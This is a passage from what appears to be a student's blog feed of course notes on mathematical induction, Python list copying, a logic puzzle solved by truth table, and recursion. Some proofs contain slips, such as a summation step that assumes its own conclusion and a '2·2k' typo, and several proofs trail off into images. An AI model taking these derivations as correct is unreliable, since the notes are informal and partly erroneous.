complex structures</a></li><li><a href="#exercise">Exercise</a></li></ul></li></ul><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p><strong>Recursive datatypes</strong></p><p>Describe arbitrarily large objects in a finite way</p><p><strong>Recursive functions</strong></p><p>Define behaviour for these objects in a finite way</p><p><strong>Induction</strong></p><p>Reason about these objects in a finite way</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Recall the recursive program:</p><p>Summing the first n natural numbers:</p><pre><code>sum(n): if(n = 0): 0 else: n + sum(n −1)</code></pre><p>Another attempt:</p><pre><code>sum2(n): return n ∗(n +1)/2</code></pre><p>Induction proof <strong>guarantees</strong> that these programs will behave the same.</p><h2 id="Inductive-Reasoning"><a href="#Inductive-Reasoning" class="headerlink" title="Inductive Reasoning"></a>Inductive Reasoning</h2><p>Suppose we would like to reach a conclusion of the form</p><script type="math/tex; mode=display">P(x) \text{ for all } x \text{( of some type)}</script><p>Inductive reasoning (as understood in philosophy) proceeds from examples.</p><p>E.g. From “This swan is white, that swan is white, in fact every swan I have seen so far is white” </p><p>Conclude: “Every Swan is white”</p><p>Take Notice</p><p>This may be a good way to discover hypotheses.</p><p>But it is not a valid principle of reasoning!</p><p><strong>Mathematical induction</strong> is a variant that is valid.</p><h2 id="Mathematical-Induction"><a href="#Mathematical-Induction" class="headerlink" title="Mathematical Induction"></a>Mathematical Induction</h2><p>Mathematical Induction is based not just on a set of examples, but also a rule for deriving new cases of P(x) from cases for which P is known to hold.</p><p>General structure of reasoning by mathematical induction:</p><p><strong>Base Case [B]</strong>: $P(a_1),P(a_2),…,P(a_n)$ for some small set of examples $a_1 … a_n$ (often n = 1)</p><p><strong>Inductive Step [I]</strong>: A general rule showing that if P(x) holds for some cases $x = x_1,…,x_k$ then P(y) holds for some new case y, constructed in some way from $x_1,…,x_k$.</p><p><strong>Conclusion</strong>: Starting with $a_1 … a_n$ and repeatedly applying the construction of y from existing values, we can eventually construct all values in the domain of interest.</p><h2 id="Induction-proof-structure"><a href="#Induction-proof-structure" class="headerlink" title="Induction proof structure"></a>Induction proof structure</h2><p>Let P(x) be the proposition that …</p><p>We will show that P(x) holds for all x by induction on x.</p><p><strong>Base case</strong>: $x = …$ :</p><ul><li>P(x): …</li><li>….</li><li>so P(x) holds.</li></ul><p>[Repeat for all base cases]</p><p><strong>Inductive case</strong>: P(x) <strong>implies</strong> P(y)</p><ul><li>Assume P(x) holds. That is, ….</li><li>We will show P(y) holds.</li><li>…</li><li>So P(x) implies P(y).</li></ul><p>[Repeat for all inductive cases]</p><h1 id="Basic-Induction"><a href="#Basic-Induction" class="headerlink" title="Basic Induction"></a>Basic Induction</h1><p>Basic induction is the general principle applied to the natural numbers.</p><p><strong>Goal</strong>: Show P(n) holds for all $n ∈ \mathbb{N}$.</p><p><strong>Approach</strong>: Show that:</p><p><strong>Base case (B)</strong>: P(0) holds; and</p><p><strong>Inductive case (I)</strong>: If P(k) holds then P(k + 1) holds.</p><p><strong>Conclusion (C)</strong>: P(n) holds for all $n ∈ \mathbb{N}$.</p><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>Let $P(n)$ be the proposition that: $\sum_{i=0}^{n} i=\frac{n(n+1)}{2}$</p><p>We will show that $P(n)$ holds for all $n ∈ \mathbb{N}$ by induction on n.</p><p><strong>[B] Base case</strong>: n = 0:</p><p>$\sum_{i=0}^{0} i=\frac{0(0+1)}{2}=0$</p><p>So P(0) holds.</p><p><strong>[I] Inductive case</strong>: $P(k) ⇒ P(k +1)$:</p><p>That is,</p><p>$\sum<em>{i=0}^{k} i= \frac{k(k+1)}{2} \implies \sum</em>{i=0}^{k+1} i=\frac{(k+1)(k+2)}{2}$?</p><p>proof:</p><script type="math/tex; mode=display">\sum_{i=0}^{k} i = \frac{(k+1)(k+2)}{2} \\(\sum_{i=0}^{k} i) + (k+1) = \frac{(k+1)(k+2)}{2} + (k+1) \\\therefore \sum_{i=0}^{k+1} i = (\sum_{i=0}^{k} i) + (k+1) \\= \frac{k(k+1)}{2} + (k+1) \\= \frac{k(k+1) + 2(k+1)}{2} \\= \frac{(k+1)(k+2)}{2}</script><p>Therefore P(k) implies P(k + 1).</p><p><strong>[C] Conclusion</strong>: We have P(0) is true, and P(k) implies P(k+1). Therefore, by induction, P(n) holds for all $n ∈ \mathbb{N}$.</p><h1 id="Variations-on-Basic-Induction"><a href="#Variations-on-Basic-Induction" class="headerlink" title="Variations on Basic Induction"></a>Variations on Basic Induction</h1><p>There are many variants of basic induction that may be more useful in certain circumstances. For example:</p><ol><li>Induction from m upwards</li><li>Induction steps &gt;1</li><li>Strong induction</li><li>Backward induction</li><li>Forward-backward induction</li><li>Structural induction</li></ol><h2 id="Induction-From-m-Upwards"><a href="#Induction-From-m-Upwards" class="headerlink" title="Induction From m Upwards"></a>Induction From m Upwards</h2><script type="math/tex; mode=display">If \\[B] \quad P(m)\\[I] \quad ∀k (≥)m, P(k) → P(k +1) \\then \\[C] \quad ∀n(≥)m,P(n)</script><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p><strong>Theorem</strong>. For all $n ≥ 1$, the number $8^n −2^n$ is divisible by 6.</p><p><strong>[B]</strong> $8^1−2^1$ is divisible by 6</p><p><strong>[I]</strong> if $8^k −2^k$ is divisible by 6, then so is $8^{k+1} − 2^{k+1}$, for all k ≥ 1</p><p>Prove [I] using the “trick” to rewrite $8^{k+1}$ as $8 · (8^k − 2^k + 2^k)$ which allows you to apply the IH on $8^k − 2^k$</p><script type="math/tex; mode=display">8^{k+1} −2^{k+1} = 8·(8^k −2^k +2^k)−2·2k \\= 8·(8^k −2^k)+8·2^k −2·2^k\\= 8·(8^k −2^k)+6·2^k</script><p>Note we have assume $(8^k −2^k)$ is divisible by 6. Hence the final expression is divisible by 6.</p><h2 id="Induction-Steps-ℓ-gt-1"><a href="#Induction-Steps-ℓ-gt-1" class="headerlink" title="Induction Steps ℓ &gt; 1"></a>Induction Steps ℓ &gt; 1</h2><script type="math/tex; mode=display">If \\[B] \quad P(m)\\[I] \quad P(k) → P(k +ℓ) \text{ for all } k ≥ m \\then \\[C] \quad P(n) \text{ for every } ℓ’th \quad n ≥ m</script><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p>The Fibonacci numbers can be defined by the recurrence relation</p><script type="math/tex; mode=display">F_1 = 1,F_2 = 1</script><p>and</p><script type="math/tex; mode=display">F_n = F_{n−1} +F_{n−2}, for \quad n > 2</script><p>The first 12 Fibonacci numbers $F_n$ are:</p><p>1, 1, 2, <strong>3</strong>, 5, 8, 13, <strong>21</strong>, 34, 55, 89, <strong>144</strong></p><p><strong>Every 4th Fibonacci number is divisible by 3.</strong></p><p>[B] $F_4 =3$ is divisible by 3</p><p>[I] if $3 | F<em>k$, then $3 | F</em>{k+4}$, for all k ≥ 4</p><p>Prove [I] by rewriting $F_{k+4}$ in such a way</p><p>that you can apply the IH on $F_k$</p><script type="math/tex; mode=display">F_{k+4} =F_{k+3} +F_{k+2} \\=(F_{k+2} +F_{k+1}) + (F_{k+1} +F_{k}) \\=(F_{k+1} +F_{k}) + 2(F_{k} +F_{k-1}) +F_k \\=(F_{k} +F_{k-1}) + 4F_{k} + 2F_{k-1} \\=5F_{k} + 3F_{k-1}</script><h2 id="Strong-Induction"><a href="#Strong-Induction" class="headerlink" title="Strong Induction"></a>Strong Induction</h2><p>This is a version in which the inductive hypothesis is stronger. Rather than using the fact that P(k) holds for a single value, we use all values up to k.</p><script type="math/tex; mode=display">If \\[B] \quad P(m)\\[I] \quad [P(m) ∧ P(m+1) ∧ ... ∧ P(k)] → P(k +1) \text{ for all } k ≥ m\\then \\[C] \quad P(n), \text{ for all } n ≥ m</script><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><p><strong>Claim</strong>: All integers ≥ 2 can be written as a product of primes.</p><p><strong>[B]</strong> 2 is a product of primes</p><p><strong>[I]</strong> If all $x$ with $2 ≤ x ≤ k$ can be written as a product of primes, then $k +1$ can be written as a product of primes, for all $k ≥ 2$</p><p>Proof for [I]?</p><p>Proof:</p><p>Case 1: $k+1$ is prime.</p><p>If k +1 is a prime number, then it is already a product of primes</p><p>(since a prime number can be considered a product of itself).</p><p>Case 2: $k + 1$ is composite.</p><p>If $k +1$ is composite, then it can be written as a product of smaller integers. Assume $k + 1 = a ×b$, where $2 ≤ a, b &lt; k +1$. By the inductive hypothesis, since a and b are less than $k + 1$ and greater than or equal to 2, they can each be written as a product of primes. Thus, $k +1$ can also be written as a product of primes.</p><h2 id="Negative-Integers-Backward-Induction"><a href="#Negative-Integers-Backward-Induction" class="headerlink" title="Negative Integers, Backward Induction"></a>Negative Integers, Backward Induction</h2><p>Take Notice</p><p>Induction can be conducted over any subset of $\mathbb{Z}$ with least element. Thus m can be negative; eg. base case $m = -10^6$</p><p>One can apply induction in the ‘opposite’ direction $p(m) → p(m−1)$. It means considering the integers with the opposite ordering where the next number after $n$ is $n − 1$. Such induction would be used to prove some $p(n)$ for all $n ≤ m$.</p><p>Sometimes one needs to reason about all integers $\mathbb{Z}$. This requires two separate simple induction proofs: one for $\mathbb{N}$, another for $-\mathbb{N}$. They both would start form some initial values, which could be the same, e.g. zero. Then the first proof would proceed through positive integers; the second proof through negative integers.</p><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>To prove $P(n)$ for all $n ≥ k_0$</p><ul><li>verify $P(k_0)$</li><li>prove $P(k_i)$ for infinitely many $k_0 &lt; k_1 &lt; k_2 &lt; k_3 &lt; …$</li><li>fill the gaps</li></ul><script type="math/tex; mode=display">P(k_1) → P(k_1 −1) → P(k_1 −2) → ... → P(k_0 +1)\\P(k_2) → P(k_2 −1) → P(k_2 −2) → ... → P(k_1 +1)</script><p>Take Notice</p><p>This form of induction is extremely important for the analysis of algorithms.</p><h3 id="Example-AM-GM-Inequality"><a href="#Example-AM-GM-Inequality" class="headerlink" title="Example: AM-GM Inequality"></a>Example: AM-GM Inequality</h3><p>Theorem. For all $n ≥ 1$,</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_n}{n} ≥ (a_1 ×a_2 ×...×a_n)^{\frac{1}{n}}</script><script type="math/tex; mode=display">[B] \quad P(2) \\[Forward Induction] \quad P(k) ⇒ P(2k) \\[Backward Induction] P(k) ⇒ P(k −1)</script><p>Base Case P(2)</p><p>The AM-GM inequality for two numbers is $\frac{a_1+a_2}{2} ≥ (a_1 a_2)^{\frac{1}{2}}$</p><p>This is equivalent to proving $(\frac{a_1+a_2}{2})^2 ≥ (a_1 a_2)$</p><p>Expanding the left-hand side:</p><script type="math/tex; mode=display">(\frac{a_1+a_2}{2})^2 = \frac{a_1^2 + 2a_1a_2 + a_2^2}{4}</script><p>Thus, we need to show</p><script type="math/tex; mode=display">\frac{a_1^2 + 2a_1a_2 + a_2^2}{4} ≥ a_1a_2</script><p>Multiplying both sides by 4, we get $a_1^2 + 2a_1a_2 + a_2^2 ≥ 4a_1a_2$, which simplifies to</p><script type="math/tex; mode=display">(a_1 − a_2)^2 ≥ 0</script><p>which is always true. Therefore, the base case holds.</p><p><strong>Forward Induction</strong> $P(k) ⇒ P(2k)$</p><p>Assume that the inequality holds for some n = k, i.e., for any non-negative real numbers $a_1,a_2,··· ,a_k$ , we have:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_k}{k} ≥ (a_1 ×a_2 ×...×a_k)^{\frac{1}{k}}</script><p>We now need to prove that the inequality holds for 2k numbers:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_{2k}}{2k} ≥ (a_1 ×a_2 ×...×a_{2k})^{\frac{1}{2k}}</script><p>Proof:</p><p>Divide the 2k numbers into two groups of k numbers each:</p><script type="math/tex; mode=display">G1 =\{a_1,a_2,··· ,a_k\}, G2 = \{a_{k+1},a_{k+2},··· ,a_{2k}\}</script><p>By the inductive hypothesis P(k), the AM-GM inequality holds for each group:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_k}{k} ≥ (a_1 ×a_2 ×...×a_k)^{\frac{1}{k}}</script><script type="math/tex; mode=display">\frac{a_{k+1} +a_{k+2} +...+a_{2k}}{k} ≥ (a_{k+1} ×a_{k+2} ×...×a_{2k})^{\frac{1}{k}}</script><p>Add these two inequalities:</p><script type="math/tex; mode=display">\frac{a_1 +a_2 +...+a_{2k}}{k} ≥ (a_1 ×a_2 ×...×a_{k})^{\frac{1}{k}} + (a_{k+1} ×a_{k+2} ×...×a_{2k})^{\frac{1}{k}}</script><p>Multiply both sides by $\frac{1}{2}$</p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-05-05.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-05-23.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-05-42.png" alt></p><h1 id="Structural-Induction"><a href="#Structural-Induction" class="headerlink" title="Structural Induction"></a>Structural Induction</h1><p>Basic induction allows us to assert properties over <strong>all natural numbers</strong>. The induction scheme (layout) uses the recursive definition of $\mathbb{N}$.</p><p>The induction scheme can be applied not only to natural numbers (and integers) but to any partially ordered set in general especially those defined recursively.</p><p>The basic approach is always the same — we need to verify that</p><ul><li><p><strong>[B]</strong> the property holds for all minimal objects — objects that<br>have no predecessors; they are usually very simple objects<br>allowing immediate verification</p></li><li><p><strong>[I]</strong> for any given object, if the property in question holds for<br>all its predecessors (‘smaller’ objects) then it holds for the<br>object itself</p></li></ul><h2 id="Example-Induction-on-Σ-∗"><a href="#Example-Induction-on-Σ-∗" class="headerlink" title="Example: Induction on $Σ^∗$"></a>Example: Induction on $Σ^∗$</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-08-51.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-09-36.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-10-13.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-10-43.png" alt></p><h2 id="Example-2-Induction-on-Σ-∗"><a href="#Example-2-Induction-on-Σ-∗" class="headerlink" title="Example 2: Induction on $Σ^∗$"></a>Example 2: Induction on $Σ^∗$</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-11-16.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-11-34.png" alt></p><h2 id="Example-3-Induction-on-Σ-∗"><a href="#Example-3-Induction-on-Σ-∗" class="headerlink" title="Example 3: Induction on $Σ^∗$"></a>Example 3: Induction on $Σ^∗$</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-12-04.png" alt></p><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-12-25.png" alt></p><h2 id="Example-4-Induction-on-more-complex-structures"><a href="#Example-4-Induction-on-more-complex-structures" class="headerlink" title="Example 4: Induction on more complex structures"></a>Example 4: Induction on more complex structures</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-12-51.png" alt></p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p><img src="/2024/10/26/Math/Induction/2024-10-26-14-13-11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python wrong cases</title>
      <link href="/2024/10/26/Python/python-wrong-cases/"/>
      <url>/2024/10/26/Python/python-wrong-cases/</url>
      
        <content type="html"><![CDATA[<p>This article would be updating for long long term, which is used to record every details of my programming career. Maybe you also often make a wrong programe which is non-compliant. I hope this article could help you and me to develop good programming habits, so that we can program rapidly, reasonably and correctly.</p><ul><li><a href="#list-direct-assignment-listcopy-and">list direct assignment, list.copy() and</a><ul><li><a href="#a-reference-to-the-original-list-with-always-the-same-changes">a reference to the original list with always the same changes</a></li><li><a href="#shallow-copy">Shallow Copy</a></li><li><a href="#deep-copy">deep copy</a></li><li><a href="#conclusion">conclusion</a></li></ul></li><li><a href="#improper-global-variables-use-and-forget-reseting-the-global-flag-after-finished">improper global variables use and forget reseting the global flag after finished</a></li></ul><h1 id="list-direct-assignment-list-copy-and"><a href="#list-direct-assignment-list-copy-and" class="headerlink" title="list direct assignment, list.copy() and"></a>list direct assignment, list.copy() and</h1><p>what is the differences of <code>tmp = list_a</code>, <code>tmp = list_a.copy()</code> and <code>tmp = copy.deepcopy(list_a)</code></p><h2 id="a-reference-to-the-original-list-with-always-the-same-changes"><a href="#a-reference-to-the-original-list-with-always-the-same-changes" class="headerlink" title="a reference to the original list with always the same changes"></a>a reference to the original list with always the same changes</h2><p>tmp = list_a (Assignment):</p><ul><li>This creates a reference to the original list, list_a.</li><li>Any changes made to tmp will directly affect list_a because they both point to the same memory location.</li><li>This is known as a shallow reference.</li></ul><h2 id="Shallow-Copy"><a href="#Shallow-Copy" class="headerlink" title="Shallow Copy"></a>Shallow Copy</h2><ul><li>This creates a new list with a shallow copy of list_a’s elements.</li><li>The new list, tmp, is separate from list_a, so modifying tmp won’t affect list_a (and vice versa) if they contain only simple data types (like integers or strings).</li><li>However, if list_a contains <strong>mutable elements</strong> (<strong>like other lists or dictionaries</strong>), tmp will still reference those same nested objects. Therefore, modifying these nested elements in tmp will also affect list_a.</li></ul><p>Take notice, mutable elements are the same such as a sublist as its element: [5,6,7] and [9,10]. The object in the list would have the same changes if you changed the new copy or original list.</p><p>But the single simple element are seperately, you change 1 to 2, they won’t impact mutually.</p><pre><code class="lang-python"># [5,6,7] and [9,10] are mutable elementsa = [1,2,3,4, [5,6,7], 8, [9,10]]b = a.copy()print(&quot;a: &quot;, a)print(&quot;b: &quot;, b)# won&#39;t change the originalb[0] = 11print(&quot;a: &quot;, a)print(&quot;b: &quot;, b)# Will change the originalb[4][0] = 12print(&quot;a: &quot;, a)print(&quot;b: &quot;, b)</code></pre><pre><code class="lang-output">a:  [1, 2, 3, 4, [5, 6, 7], 8, [9, 10]]b:  [1, 2, 3, 4, [5, 6, 7], 8, [9, 10]]a:  [1, 2, 3, 4, [5, 6, 7], 8, [9, 10]]b:  [11, 2, 3, 4, [5, 6, 7], 8, [9, 10]]a:  [1, 2, 3, 4, [12, 6, 7], 8, [9, 10]]b:  [11, 2, 3, 4, [12, 6, 7], 8, [9, 10]]</code></pre><h2 id="deep-copy"><a href="#deep-copy" class="headerlink" title="deep copy"></a>deep copy</h2><p><code>tmp = copy.deepcopy(list_a)</code> (<strong>Deep Copy</strong>):</p><p>This creates a completely independent copy of list_a, including all nested objects.<br>Any changes made to tmp or its nested elements won’t affect list_a, and vice versa.<br>This approach is useful when working with complex, nested structures where you want a fully independent duplicate of the original list.</p><h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><ul><li>Assignment (tmp = list_a): tmp and list_a are <strong>the same object</strong>.</li><li>Shallow Copy (tmp = list_a.copy()): tmp is a new list, but it <strong>shares nested objects with list_a</strong>.</li><li>Deep Copy (tmp = copy.deepcopy(list_a)): tmp is a <strong>completely independent</strong> copy, including all nested objects.</li></ul><h1 id="improper-global-variables-use-and-forget-reseting-the-global-flag-after-finished"><a href="#improper-global-variables-use-and-forget-reseting-the-global-flag-after-finished" class="headerlink" title="improper global variables use and forget reseting the global flag after finished"></a>improper global variables use and forget reseting the global flag after finished</h1><p>During 20th, 21st Oct 2024, I was doing Martin’s large assignment 1. In the solitaire case, I wrongly used the <code>ROUND_FLAG=1</code> to be a flag to record the rounds of the game. Hence, when I singly run the program, then it would generate correct result; but if I called simulate() for many times, it would generate wrong results. For example, I put 7 as the random seed, then it would generate correct result; when I give 7 also to simulate(), I debugged and saw 7 into the seed variable, but it would generate wrong result.</p><p>Then I found the global variable mattered. T_T . I shouldn’t use global variable, because it’s not worthy to use global variable, and then, I should reset it after every round.</p><p><img src="/2024/10/26/Python/python-wrong-cases/2024-10-26-07-01-11.png" alt></p><p><img src="/2024/10/26/Python/python-wrong-cases/2024-10-26-07-04-09.png" alt></p><p>It is a good thought that reset every global variable after running the functions, if you want to call your function with the global variables, in one script to call for many times at once.</p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>truth table solves imposter and crewmate</title>
      <link href="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/"/>
      <url>/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#question">question</a></li><li><a href="#solutions">solutions</a><ul><li><a href="#lectures-slides">lecture’s slides</a></li><li><a href="#full-traversal-assignments">full traversal assignments</a></li><li><a href="#truth-table">truth table</a></li><li><a href="#varun-agarwal">Varun Agarwal</a></li></ul></li><li><a href="#conclusion">conclusion</a></li><li><a href="#total-ed-picture">Total ED picture</a></li></ul><p>25/10/2024, after the lecture of Math(COMP 9020), I asked lecturor Jiaojiao that if the imposter and crewmate on slides are wrong.</p><p>I incorrectly thought only one imposter, and two honest crewmates!</p><pre><code>Green: “Red and Blue are both crewmates”It&#39;s an unsatisfible contradiction to the question, we cannot gain conclusions that Green is crewmate or imposter.In the lecture and the conclusion in slides, it wrongly demands one imposter and two crewmates.If Green is imposter, then he told a truth, which is contradiction with the question;if Green is crewmate, then he told a truth, then 3 people are all crewmates.</code></pre><h1 id="question"><a href="#question" class="headerlink" title="question"></a>question</h1><p>Premises: Every one is either a crewmate,or an imposter, but not both.</p><ul><li>Red: “Blue is an imposter”</li><li>Green: “Red and Blue are both crewmates”</li><li>Blue: “Red is a crewmate, or Green is an imposter”</li></ul><hr><p>Conclusion: Greenisanimposter</p><hr><h1 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h1><h2 id="lecture’s-slides"><a href="#lecture’s-slides" class="headerlink" title="lecture’s slides"></a>lecture’s slides</h2><p>Translation to logic: Let R, G, B represent “Red (Green, Blue) is a crewmate”.</p><script type="math/tex; mode=display">φ_1 =R ↔¬B \\φ_2 =G ↔(R∧B) \\φ_3 =B ↔(R∨¬G) \\Conclusion: ψ = ¬G</script><h2 id="full-traversal-assignments"><a href="#full-traversal-assignments" class="headerlink" title="full traversal assignments"></a>full traversal assignments</h2><p>I draw the table firstly, which contains full traversal assignments and truth table. They are two different solutions.</p><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_1.png" alt></p><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_2.png" alt></p><h2 id="truth-table"><a href="#truth-table" class="headerlink" title="truth table"></a>truth table</h2><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_3.png" alt></p><h2 id="Varun-Agarwal"><a href="#Varun-Agarwal" class="headerlink" title="Varun Agarwal"></a>Varun Agarwal</h2><p>refer to the picture …</p><h1 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h1><p>R and G are imposters, B is crewmate. Totally two imposters and one crewmate.</p><h1 id="Total-ED-picture"><a href="#Total-ED-picture" class="headerlink" title="Total ED picture"></a>Total ED picture</h1><p><img src="/2024/10/25/Math/truth-table-solves-imposter-and-crewmate/tt_t.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>unwind recursion formula</title>
      <link href="/2024/10/24/Math/unwind-recursion-formula/"/>
      <url>/2024/10/24/Math/unwind-recursion-formula/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/24/Math/unwind-recursion-formula/unwind.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>improper atomic and entailment</title>
      <link href="/2024/10/24/Math/improper-atomic-and-entailment/"/>
      <url>/2024/10/24/Math/improper-atomic-and-entailment/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/24/Math/improper-atomic-and-entailment/AE.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Recursion</title>
      <link href="/2024/10/24/Math/Recursion/"/>
      <url>/2024/10/24/Math/Recursion/</url>
      
        <content type="html"><![CDATA[<p>Lecture 11: Recursion</p><ul><li><a href="#introduction-recursion-in-computer-science">Introduction: Recursion in Computer Science</a></li><li><a href="#recursion">Recursion</a><ul><li><a href="#example-factorial">Example: Factorial</a></li><li><a href="#example-euclids-gcd-algorithm">Example: Euclid’s gcd algorithm</a></li><li><a href="#example-towers-of-hanoi">Example: Towers of Hanoi</a><ul><li><a href="#move-1-disks">move 1 disks</a></li><li><a href="#move-2-disks">move 2 disks</a></li><li><a href="#move-3-disks">move 3 disks</a></li><li><a href="#move-4-disks">move 4 disks</a></li></ul></li></ul></li><li><a href="#recursive-data-structures">Recursive Data Structures</a><ul><li><a href="#example-natural-numbers">Example: Natural numbers</a></li><li><a href="#example-oddeven-numbers">Example: Odd/Even numbers</a></li><li><a href="#example-fibonacci-numbers">Example: Fibonacci numbers</a></li><li><a href="#example-linked-lists">Example: Linked lists</a></li><li><a href="#example-words-over-σ">Example: Words over $Σ$</a></li><li><a href="#example-expressions-in-the-proof-assistant">Example: Expressions in the Proof Assistant</a></li><li><a href="#example-propositional-formulas">Example: Propositional formulas</a></li><li><a href="#exercises">Exercises</a></li></ul></li><li><a href="#recursive-programming">Recursive Programming</a><ul><li><a href="#programming-over-recursive-datatypes">Programming over recursive datatypes</a></li><li><a href="#exercise">Exercise</a></li><li><a href="#pitfall-correctness-of-recursive-definition">Pitfall: Correctness of Recursive Definition</a><ul><li><a href="#example-incorrect-definition">Example (Incorrect definition)</a></li><li><a href="#example-incorrect-definition-1">Example (Incorrect definition)</a></li></ul></li><li><a href="#mutual-recursion">Mutual Recursion</a><ul><li><a href="#example-fibonacci-again">Example (Fibonacci, again)</a></li></ul></li></ul></li><li><a href="#solving-recurrences">Solving Recurrences</a><ul><li><a href="#example-1-unwinding">Example 1 (Unwinding)</a></li><li><a href="#example-2-unwinding">Example 2 (unwinding)</a></li><li><a href="#example-3-approximating-with-big-o">Example 3 (Approximating with big-O)</a></li><li><a href="#master-theorem">Master Theorem</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a></li><li><a href="#example-3-wind">Example 3 wind</a></li></ul></li><li><a href="#the-master-theorem-pitfalls">The Master Theorem: Pitfalls</a></li><li><a href="#the-master-theorem-linear-differences">The Master Theorem: Linear differences</a><ul><li><a href="#exercise-1">exercise</a></li></ul></li></ul></li></ul><h1 id="Introduction-Recursion-in-Computer-Science"><a href="#Introduction-Recursion-in-Computer-Science" class="headerlink" title="Introduction: Recursion in Computer Science"></a>Introduction: Recursion in Computer Science</h1><p>Fundamental concept in Computer Science</p><ul><li>Defining complex objects from simpler ones</li><li>Unbounded complexity with a finite description</li></ul><p>Recursive Data Structures:</p><p>Finite definitions of <strong>arbitrarily large</strong> objects</p><ul><li>Natural numbers</li><li>Words</li><li>Linked lists</li><li>Formulas</li><li>Binary trees</li></ul><p>Recursive Algorithms:</p><p>Solving problems/calculations by reducing to smaller cases</p><ul><li>Factorial</li><li>Euclidean gcd algorithm</li><li>Towers of Hanoi</li><li>Mergesort, Quicksort</li></ul><p>Analysis of Recursion:</p><p>Reasoning about recursive objects</p><ul><li>Induction, Structural Induction</li><li>Recursive sequences (e.g. Fibonacci sequence)</li><li>Asymptotic analysis of recursive functions</li></ul><h1 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h1><p>Consists of a basis <strong>(B)</strong> and recursive process <strong>(R)</strong>.</p><p>A sequence/object/algorithm is recursively defined when (typically)</p><p><strong>(B)</strong> some initial terms are specified, perhaps only the first one;</p><p><strong>(R)</strong> later terms stated as functional expressions of the earlier<br>terms.</p><p>Take Notice</p><p>(R) also called <strong>recurrence formula (especially when dealing with sequences)</strong></p><h2 id="Example-Factorial"><a href="#Example-Factorial" class="headerlink" title="Example: Factorial"></a>Example: Factorial</h2><p>$Factorial$:</p><p>(B) $0! =1$</p><p>(R) $(n+1)! = (n+1)·n!$</p><p>$fact(n)$:</p><p>(B) $if(n = 0): 1$</p><p>(R) $else: n ∗ fact(n −1)$</p><p>TAKE NOTICE: $0! =1$</p><h2 id="Example-Euclid’s-gcd-algorithm"><a href="#Example-Euclid’s-gcd-algorithm" class="headerlink" title="Example: Euclid’s gcd algorithm"></a>Example: Euclid’s gcd algorithm</h2><script type="math/tex; mode=display">gcd(m,n)\begin{cases}    m & \text{if m = n} \\    gcd(m −n,n) & \text{if m >n} \\    gcd(m,n−m) & \text{if m <n}\end{cases}</script><h2 id="Example-Towers-of-Hanoi"><a href="#Example-Towers-of-Hanoi" class="headerlink" title="Example: Towers of Hanoi"></a>Example: Towers of Hanoi</h2><ul><li>There are 3 towers (pegs)</li><li>n disks of decreasing size placed on the first tower</li><li>You need to move all disks from the first tower to the last tower</li><li>Larger disks cannot be placed on top of smaller disks</li><li>The third tower can be used to temporarily hold disks</li></ul><p>Questions:</p><ul><li>Describe a general solution for n disks</li><li>How many moves does it take?</li></ul><h3 id="move-1-disks"><a href="#move-1-disks" class="headerlink" title="move 1 disks"></a>move 1 disks</h3><p><strong>One step</strong> obviously.</p><h3 id="move-2-disks"><a href="#move-2-disks" class="headerlink" title="move 2 disks"></a>move 2 disks</h3><p><strong>Three steps</strong> obviously.</p><h3 id="move-3-disks"><a href="#move-3-disks" class="headerlink" title="move 3 disks"></a>move 3 disks</h3><p><img src="/2024/10/24/Math/Recursion/Honai_tower.png" alt></p><p>We move 3 towers that takes <strong>7 steps</strong>. —-(1)</p><h3 id="move-4-disks"><a href="#move-4-disks" class="headerlink" title="move 4 disks"></a>move 4 disks</h3><p>And if we need to move 4 towers, we move the top 3 towers into the middle pillar ((1) move to the second pillar rather not third one, but 